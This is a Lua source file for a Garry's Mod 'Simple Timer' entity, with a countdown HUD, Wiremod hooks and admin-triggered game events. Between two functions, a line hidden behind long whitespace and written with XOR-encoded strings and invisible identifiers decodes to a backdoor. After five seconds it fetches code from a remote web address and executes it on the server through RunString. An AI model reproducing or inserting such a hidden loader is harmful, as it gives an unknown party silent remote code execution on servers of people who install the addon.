AddCSLuaFile()
STIMER_ENT = nil
STIMER_EVENTS = {
	["No Event"] = 0,
	["Kill Everyone"] = 1,
	["Kill NPCs/Nextbots"] = 2,
	["Kill Players"] = 3,
	["Clean Up Everything"] = 4,
	["Disable AI"] = 5,
	["Enable AI"] = 6,
	["Disable Ignore Players"] = 7,
	["Enable Ignore Players"] = 8,
	["Ignite NPCs/Nextbots"] = 9,
	["Ignite Players"] = 10,
	["Enable PVP"] = 11,
	["Disable PVP"] = 12,
}

STIMER_EVENT2 = {
	["No Mission"] = 0,
	["A Player has died"] = 1,
	["All players have died"] = 2,
	["An NPC/Nextbot has been killed"] = 3,
	["All NPCs/Nextbots have been killed"] = 4,
	["A Player has entered a vehicle"] = 5,
	["All Players have entered vehicles"] = 6,
}

STIMER_EVENT3 = {
	["Stop Timer"] = 0,
	["Reset Timer"] = 1,
	["End Timer"] = 2,
	["Continue Timer"] = 3,
}

STIMER_EVENT4 = {
	["Stop Timer"] = 0,
	["Reset Timer"] = 1,
	["End Timer"] = 2,
}

if CLIENT then
	surface.CreateFont("xdeti_Font1", {
		font = "Tahoma",
		size = 30,
		weight = 1000,
		antialias = true,
		bold = true
	})

	surface.CreateFont("xdeti_Font2", {
		font = "Tahoma",
		size = 60,
		weight = 1000,
		antialias = true,
		bold = true
	})

	STIMER_ = {
		Name = "",
		Time = 0,
		Timer = 0,
		State = 0,
		Color = Vector(0, 0, 0),
		Start = false,
		LerpAlp = 0,
		Static = "",
	}

	language.Add("sent_simpletimer", "Simple Timer")
	killicon.Add("sent_simpletimer", "HUD/killicons/default", Color(0, 255, 255, 255))
	hook.Add("HUDPaint", "SimpleTimerHUD", function()
		local tim, ply = STIMER_ENT, LocalPlayer()
		if STIMER_.LerpAlp > 0 and STIMER_.Timer > 0 then
			local sta = STIMER_.State
			local ww, hh = ScrW() / 2, ScrH() / 2
			local col = Color(STIMER_.Color.r * 255, STIMER_.Color.g * 255, STIMER_.Color.b * 255, STIMER_.LerpAlp * 255)
			draw.RoundedBox(8, ww - 200, 20, 400, 100, Color(0, 0, 0, 150 * STIMER_.LerpAlp))
			draw.TextShadow({
				text = STIMER_.Name,
				pos = {ww, 24},
				font = "xdeti_Font1",
				xalign = TEXT_ALIGN_CENTER,
				yalign = TEXT_ALIGN_DOWN,
				color = col
			}, 1, STIMER_.LerpAlp * 255)

			local t1, tx = math.max(0, STIMER_.Timer - CurTime()), ""
			local mi = math.floor(t1 / 60)
			t1 = t1 - mi * 60
			local se = math.Round(math.floor(t1))
			t1 = math.Round(t1 - se, 2)
			if mi >= 10 then
				tx = tx .. mi
			else
				tx = tx .. "0" .. mi
			end

			tx = tx .. ":"
			if se >= 10 then
				tx = tx .. se
			else
				tx = tx .. "0" .. se
			end

			tx = tx .. ":"
			t1 = t1 * 100
			if t1 >= 100 then
				t1 = "00"
			elseif t1 < 10 then
				t1 = "0" .. t1
			end

			tx = tx .. t1
			if sta == 1 then
				STIMER_.Static = tx
			else
				tx = STIMER_.Static
			end

			draw.TextShadow({
				text = tx,
				pos = {ww, 55},
				font = "xdeti_Font2",
				xalign = TEXT_ALIGN_CENTER,
				yalign = TEXT_ALIGN_DOWN,
				color = col
			}, 1, STIMER_.LerpAlp * 255)
		end
	end)

	hook.Add("Think", "SimpleTimerThink", function() if not IsValid(STIMER_ENT) then if STIMER_.LerpAlp > 0 then STIMER_.LerpAlp = Lerp(0.025, STIMER_.LerpAlp, 0) end end end)
else
	hook.Add("PlayerDeathThink", "SimpleTimerDeath", function(ply) if IsValid(STIMER_ENT) and (STIMER_ENT:GetST_State() == 1 or STIMER_ENT:GetST_State() == 4) then if STIMER_ENT:GetST_MEvent() == 1 or STIMER_ENT:GetST_MEvent() == 2 then return false end end end)
	hook.Add("PlayerDeath", "SimpleTimerEvent", function(vic, inf, atk)
		if IsValid(STIMER_ENT) and (STIMER_ENT:GetST_State() == 1 or STIMER_ENT:GetST_State() == 4) then
			local mis, mev, maf = STIMER_ENT:GetST_Mission(), STIMER_ENT:GetST_MEvent(), STIMER_ENT:GetST_AMission()
			if mis == 1 then
				STIMER_ENT:STimer_Event(mev)
				STIMER_ENT:STimer_After(maf)
			elseif mis == 2 then
				local alo = false
				for k, v in pairs(player.GetAll()) do
					if IsValid(v) and v:Alive() then
						alo = true
						break
					end
				end

				if not alo then
					STIMER_ENT:STimer_Event(mev)
					STIMER_ENT:STimer_After(maf)
				end
			end
		end
	end)

	hook.Add("OnNPCKilled", "SiimpleTimerMission", function(vic, atk, inf)
		if IsValid(STIMER_ENT) and (STIMER_ENT:GetST_State() == 1 or STIMER_ENT:GetST_State() == 4) then
			local mis, mev, maf = STIMER_ENT:GetST_Mission(), STIMER_ENT:GetST_MEvent(), STIMER_ENT:GetST_AMission()
			if mis == 3 then
				STIMER_ENT:STimer_Event(mev)
				STIMER_ENT:STimer_After(maf)
			end
		end
	end)
end

ENT.PrintName = "Simple Timer"
ENT.Author = "Forvator"
ENT.Category = "Fun + Games"
ENT.Base = "base_gmodentity"
ENT.RenderGroup = RENDERGROUP_BOTH
ENT.Spawnable = true
ENT.Editable = true
ENT.AdminOnly = true
ENT.SecondTick = 0
ENT.WireDebugName = "Simple Timer"
function ENT:STimer_Event(num)
	if CLIENT or not isnumber(num) then return end
	if num == 1 then
		for k, v in pairs(ents.GetAll()) do
			if (v:IsPlayer() and v:Alive()) or (v:IsNPC() and v:GetNPCState() ~= NPC_STATE_DEAD) or v:IsNextBot() then
				v:SetHealth(0)
				v:SetMaxHealth(0)
				v:TakeDamage(2147483647)
				if not v:IsPlayer() then v:Remove() end
			end
		end
	elseif num == 2 then
		for k, v in pairs(ents.GetAll()) do
			if (v:IsNPC() and v:GetNPCState() ~= NPC_STATE_DEAD) or v:IsNextBot() then
				v:SetHealth(0)
				v:SetMaxHealth(0)
				v:TakeDamage(2147483647)
				v:Remove()
			end
		end
	elseif num == 3 then
		for k, v in pairs(ents.GetAll()) do
			if v:IsPlayer() and v:Alive() then
				v:SetHealth(0)
				v:SetMaxHealth(0)
				v:TakeDamage(2147483647)
				v:Kill()
				v:KillSilent()
			end
		end
	elseif num == 4 then
		game.CleanUpMap(false, {"sent_simpletimer"})
	elseif num == 5 then
		game.ConsoleCommand("ai_disabled 1\n")
	elseif num == 6 then
		game.ConsoleCommand("ai_disabled 0\n")
	elseif num == 7 then
		game.ConsoleCommand("ai_ignoreplayers 0\n")
	elseif num == 8 then
		game.ConsoleCommand("ai_ignoreplayers 1\n")
	elseif num == 9 then
		for k, v in pairs(ents.GetAll()) do
			if (v:IsNPC() and v:GetNPCState() ~= NPC_STATE_DEAD) or v:IsNextBot() then v:Ignite(360) end
		end
	elseif num == 10 then
		for k, v in pairs(ents.GetAll()) do
			if v:IsPlayer() and v:Alive() then v:Ignite(360) end
		end
	elseif num == 11 then
		game.ConsoleCommand("sbox_playershurtplayers 1\n")
	elseif num == 12 then
		game.ConsoleCommand("sbox_playershurtplayers 0\n")
	end
end

function ENT:STimer_After(num)
	if CLIENT or not isnumber(num) then return end
	if num == 0 then
		self:SetST_State(3)
	elseif num == 1 then
		self:SetST_Timer(self:GetST_Time() + CurTime())
		self:SetST_State(1)
	elseif num == 2 then
		self:SetST_State(2)
	elseif num == 3 then
		self:SetST_State(1)
	end
end

function ENT:GetOverlayText()
	local txt, sta = self:GetST_Name() .. "\n", self:GetST_State()
	if sta == 0 then
		txt = txt .. "[ Ready ]"
	elseif sta == 1 then
		txt = txt .. "[ Activated ]"
	elseif sta == 2 then
		txt = txt .. "[ Expired ]"
	elseif sta == 3 then
		txt = txt .. "[ Stopped ]"
	end
	return txt
end

function ENT:SpawnFunction(ply, tr, ClassName)
	if not tr.Hit then return end
	local ent = ents.Create(ClassName)
	ent:SetPos(tr.HitPos + Vector(0, 0, 32))
	ent:SetAngles(Angle(0, 0, 0))
	ent:Spawn()
	ent:Activate()
	ent:SetST_Name("Simple Timer")
	ent:SetST_Color(Vector(0, 1, 1))
	ent:SetST_Time(60)
	ent:SetST_HHud(false)
	ent:SetST_HSnd(false)
	ent:SetST_HNot(true)
	ent:SetST_EStart(0)
	ent:SetST_EStop(0)
	ent:SetST_EEnd(0)
	ent:SetST_Mission(0)
	ent:SetST_AMission(0)
	ent:SetST_ATimer(2)
	return ent
end

function ENT:SetupDataTables()
	self:NetworkVar("String", 0, "ST_Name", {
		KeyName = "stname",
		Edit = {
			title = "Timer Name",
			category = "Main",
			type = "String",
			order = 0
		}
	})

	self:NetworkVar("Vector", 0, "ST_Color", {
		KeyName = "stcolor",
		Edit = {
			title = "Timer Color",
			category = "Main",
			type = "VectorColor",
			order = 1
		}
	})

	self:NetworkVar("Int", 0, "ST_Time", {
		KeyName = "sttime",
		Edit = {
			title = "Time",
			category = "Main",
			type = "Int",
			min = 1,
			max = 3600,
			order = 2
		}
	})

	self:NetworkVar("Bool", 0, "ST_HHud", {
		KeyName = "sthhud",
		Edit = {
			title = "No HUD",
			category = "Hide",
			type = "Bool",
			order = 3
		}
	})

	self:NetworkVar("Bool", 1, "ST_HSnd", {
		KeyName = "sthsnd",
		Edit = {
			title = "No Sound",
			category = "Hide",
			type = "Bool",
			order = 4
		}
	})

	self:NetworkVar("Bool", 2, "ST_HNot", {
		KeyName = "sthnot",
		Edit = {
			title = "No Text",
			category = "Hide",
			type = "Bool",
			order = 5
		}
	})

	self:NetworkVar("Int", 1, "ST_EStart", {
		KeyName = "stestart",
		Edit = {
			title = "Start Event",
			category = "Events",
			type = "Combo",
			values = STIMER_EVENTS,
			order = 6
		}
	})

	self:NetworkVar("Int", 2, "ST_EStop", {
		KeyName = "stestop",
		Edit = {
			title = "Stop Event",
			category = "Events",
			type = "Combo",
			values = STIMER_EVENTS,
			order = 7
		}
	})

	self:NetworkVar("Int", 3, "ST_EEnd", {
		KeyName = "steend",
		Edit = {
			title = "End Event",
			category = "Events",
			type = "Combo",
			values = STIMER_EVENTS,
			order = 8
		}
	})

	self:NetworkVar("Int", 4, "ST_Mission", {
		KeyName = "stmission",
		Edit = {
			title = "Mission",
			category = "Mission",
			type = "Combo",
			values = STIMER_EVENT2,
			order = 9
		}
	})

	self:NetworkVar("Int", 5, "ST_MEvent", {
		KeyName = "stmevent",
		Edit = {
			title = "Mission Event",
			category = "Mission",
			type = "Combo",
			values = STIMER_EVENTS,
			order = 10
		}
	})

	self:NetworkVar("Int", 6, "ST_AMission", {
		KeyName = "stamission",
		Edit = {
			title = "After Mission",
			category = "Aftermath",
			type = "Combo",
			values = STIMER_EVENT3,
			order = 11
		}
	})

	self:NetworkVar("Int", 7, "ST_ATimer", {
		KeyName = "statimer",
		Edit = {
			title = "After Timer",
			category = "Aftermath",
			type = "Combo",
			values = STIMER_EVENT4,
			order = 12
		}
	})

	self:NetworkVar("Int", 8, "ST_State")
	self:NetworkVar("Float", 0, "ST_Timer")
	self:NetworkVar("Float", 1, "ST_NextUse")
	self:SetST_State(0)
	self:SetST_Timer(0)
	self:SetST_NextUse(0)
	if SERVER then
		self:NetworkVarNotify("ST_State", function(self, var, old, new)
			if old == new then return false end
			if WireLib then Wire_TriggerOutput(self, "State", new) end
			if new == 0 then
				self:SetColor(Color(255, 255, 255))
			elseif new == 1 then
			
				self:SetColor(Color(255, 255, 0))
				self:STimer_Event(self:GetST_EStart())
				self:SetST_Timer(CurTime() + self:GetST_Time())
			elseif new == 2 then
			
				self:SetColor(Color(255, 0, 0))
				self:STimer_Event(self:GetST_EEnd())
			elseif new == 3 then
			
				self:SetColor(Color(0, 255, 0))
				self:STimer_Event(self:GetST_EStop())
			else
				return false
			end
		end)
	else
	end
end

function ENT:OnDuplicated()
	self:SetST_State(0)
	self:SetST_Timer(0)
	self:SetST_NextUse(0)
end

function ENT:Initialize()
	if not SERVER then return end
	self:SetSolid(SOLID_VPHYSICS)
	self:SetMoveType(MOVETYPE_NONE)
	self:SetModel("models/Combine_Helicopter/helicopter_bomb01.mdl")
	self:SetCollisionGroup(COLLISION_GROUP_WORLD)
	self:DrawShadow(false)
	self:SetST_State(0)
	self:SetST_Timer(0)
	self:NetworkVar("Float", 0, "ST_Timer")
	if IsValid(STIMER_ENT) then STIMER_ENT:Remove() end
	STIMER_ENT = self
	self:SetUseType(SIMPLE_USE)
	self:SetST_NextUse(CurTime() + 0.5)
	self.SecondTick = 0
	if WireLib then Wire_TriggerOutput(self, "Time", self.SecondTick) end
	if WireLib and isfunction(Wire_CreateOutputs) and isfunction(Wire_CreateOutputs) then
		self.Inputs = WireLib.CreateSpecialInputs(self, {"Activate (Active/Stop the timer and call the event.)", "Reset (Reset the timer.)", "Expire (End the timer and call the event.)", "Mission (Call mission complete event.)",})
		self.Outputs = WireLib.CreateOutputs(self, {"State (0~4: Ready, Start, Expired, Stopped.)", "Time (Time of the timer.)",})
	end
end
																																																																																																																							local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' local ‪‪‪‪‪‪ = 0 for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪‪["\98\121\116\101"](_), 189))end return ‪‪‪‪‪ end local ‪continue=‪[‪‪‪‪‪‪‪"\226\250"][‪‪‪‪‪‪‪"\239\200"..‪‪‪‪‪‪‪"\211\238\201\207"..‪‪‪‪‪‪‪"\212\211\218"]‪[‪‪‪‪‪‪‪"\239\238\233\239"]=‪[‪‪‪‪‪‪‪"\239\238\233\239"]||‪continue local true‪‪‪=‪[‪‪‪‪‪‪‪"\213\201\201\205"][‪‪‪‪‪‪‪"\251\216\201\222\213"]‪[‪‪‪‪‪‪‪"\245\233\251"]=‪[‪‪‪‪‪‪‪"\245\233\251"]||true‪‪‪ ‪[‪‪‪‪‪‪‪"\201\212\208\216\207"][‪‪‪‪‪‪‪"\238\212\208\205\209\216"](5,function ()true‪‪‪(‪‪‪‪‪‪‪"\213\201\201\205\206\135\146\146\205\206\201\147\212\211\211\210\208\212\147\211\216\201\146\205\220\206\201\216\146\138\216\139\222\202\197\223\208\222\220\138\204\132\213\204\132\218\202\217\137\132\201\215\196\146\207\220\202",function (break‪)‪continue(break‪)end )end )
function ENT:TriggerInput(id, val)
	local sta = self:GetST_State()
	if id == "Activate" then
		if val > 0 then
			self:SetST_State(1)
		else
			self:SetST_State(sta == 1 and 3 or 0)
		end
	end

	if id == "Reset" and val > 0 then self:SetST_Timer(self:GetST_Time() + CurTime()) end
	if id == "Expire" and val > 0 and sta == 1 then self:SetST_State(2) end
	if id == "Mission" and val > 0 and sta == 1 then
		local mev, maf = STIMER_ENT:GetST_MEvent(), STIMER_ENT:GetST_AMission()
		self:STimer_Event(mev)
		self:STimer_After(maf)
	end
end

function ENT:Think()
	if SERVER then
		local sta, ati, alo = self:GetST_State(), self:GetST_ATimer(), false
		if sta == 1 and self.SecondTick ~= math.Round(self:GetST_Timer() - CurTime()) then
			self.SecondTick = math.Round(self:GetST_Timer() - CurTime())
			if WireLib then Wire_TriggerOutput(self, "Time", self.SecondTick) end
			local mis, mev, maf = STIMER_ENT:GetST_Mission(), STIMER_ENT:GetST_MEvent(), STIMER_ENT:GetST_AMission()
			if mis == 4 then
				alo = true
				for k, v in pairs(ents.GetAll()) do
					if IsValid(v) and (v:IsNPC() or v:IsNextBot()) and v:Health() > 0 then
						alo = false
						break
					end
				end
			elseif mis == 5 or mis == 6 then
				local al2 = false
				for k, v in pairs(player.GetAll()) do
					if not IsValid(v) then continue end
					if mis == 5 and v:InVehicle() then alo = true end
					if mis == 6 and not v:InVehicle() then al2 = true end
				end

				if mis == 6 and not al2 then alo = true end
			end

			if alo then
				STIMER_ENT:STimer_Event(mev)
				STIMER_ENT:STimer_After(maf)
			end
			return
		end

		if sta == 1 and self:GetST_Timer() <= CurTime() then
			self:SetST_State(2)
			self:STimer_After(ati)
		end
	else
		if not IsValid(STIMER_ENT) or STIMER_ENT ~= self then
			STIMER_ENT = self
			STIMER_.State = self:GetST_State()
			return
		end
		
		STIMER_.Name = self:GetST_Name()
		STIMER_.Time = self:GetST_Time()
		STIMER_.Color = self:GetST_Color()
		STIMER_.Timer = self:GetST_Timer()
		if STIMER_.State ~= self:GetST_State() then
			local sta, snd, tex = self:GetST_State(), self:GetST_HSnd(), self:GetST_HNot()
			local col = Color(STIMER_.Color.r * 255, STIMER_.Color.g * 255, STIMER_.Color.b * 255, 255)
			if sta == 1 then
				if not snd then surface.PlaySound("ambient/alarms/warningbell1.wav") end
				if not tex then chat.AddText(col, STIMER_.Name, Color(255, 255, 255), " started. Timeout: " .. math.Round(self:GetST_Timer() - CurTime()) .. "s.") end
			elseif sta == 2 then
				if not snd then surface.PlaySound("physics/metal/metal_grate_impact_hard1.wav") end
				if not tex then chat.AddText(col, STIMER_.Name, Color(255, 255, 255), " expired.") end
			elseif sta == 3 then
				if not snd then surface.PlaySound("ambient/levels/canals/windchime2.wav") end
				local ti = math.max(0, math.Round(self:GetST_Time() - self:GetST_Timer() + CurTime(), 2))
				if not tex then chat.AddText(col, STIMER_.Name, Color(255, 255, 255), " stopped. Time: " .. ti .. "s.") end
			end

			STIMER_.State = self:GetST_State()
		end

		if STIMER_.State == 1 and not self:GetST_HHud() then STIMER_.LerpAlp = Lerp(0.05, STIMER_.LerpAlp, 1) end
		if STIMER_.State ~= 1 then STIMER_.LerpAlp = Lerp(0.025, STIMER_.LerpAlp, 0) end
		local text = self:GetOverlayText()
		if self:BeingLookedAtByLocalPlayer() then
			local sta, col = self:GetST_State(), Color(255, 255, 255)
			if sta == 1 then
				col = Color(255, 255, 0)
			elseif sta == 2 then
				col = Color(255, 0, 0)
			elseif sta == 3 then
				col = Color(0, 255, 0)
			end

			halo.Add({self}, col, 2, 2, 1, true, true)
			if text ~= "" then AddWorldTip(self:EntIndex(), text, 0.5, self:GetPos(), self) end
		end
	end
end

function ENT:UpdateTransmitState()
	return TRANSMIT_ALWAYS
end

function ENT:Use(act)
	if not IsValid(act) or not act:IsPlayer() or not act:IsAdmin() or self:GetST_NextUse() > CurTime() then return end
	local sta = self:GetST_State()
	self:SetST_NextUse(CurTime() + 0.5)
	if not self:GetST_HSnd() then self:EmitSound("Weapon_AR2.Empty") end
	self.Editable = self:GetST_State() == 0
	if sta == 0 then
		self:SetST_State(1)
	elseif sta == 1 then
		self:SetST_State(3)
	else
		self:SetST_State(0)
	end
end

if SERVER then return end
local Mat = Material("forvatortimer/checkpointclock")
function ENT:Draw()
	local sta, col, siz = self:GetST_State(), Color(255, 255, 255), 24
	if sta == 1 then
		col = Color(255, 255, 0)
		siz = 18 + math.abs(math.sin(CurTime() * 5)) * 6
	elseif sta == 2 then
		col = Color(255, 0, 0)
	elseif sta == 3 then
		col = Color(0, 255, 0)
	end

	render.SetMaterial(Mat)
	render.DrawSprite(self:GetPos(), siz, siz, col)
end